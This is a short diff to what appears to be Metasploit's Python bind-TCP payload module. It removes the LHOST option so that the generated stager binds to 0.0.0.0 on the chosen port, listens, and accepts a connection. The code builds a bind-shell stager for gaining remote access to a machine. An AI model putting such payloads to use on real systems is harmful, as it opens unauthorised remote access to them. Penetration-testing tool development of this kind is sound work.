@@ -20,8 +20,7 @@ module Payload::Python::BindTcp
   #
   def generate
     conf = {
-      port: datastore['LPORT'],
-      host: datastore['LHOST']
+      port: datastore['LPORT']
     }
 
     generate_bind_tcp(conf)
@@ -43,7 +42,7 @@ module Payload::Python::BindTcp
     # Set up the socket
     cmd  = "import socket,struct\n"
     cmd << "b=socket.socket(2,socket.SOCK_STREAM)\n" # socket.AF_INET = 2
-    cmd << "b.bind(('#{opts[:host]}',#{opts[:port]}))\n"
+    cmd << "b.bind(('0.0.0.0',#{opts[:port]}))\n"
     cmd << "b.listen(1)\n"
     cmd << "s,a=b.accept()\n"
     cmd << py_send_uuid if include_send_uuid
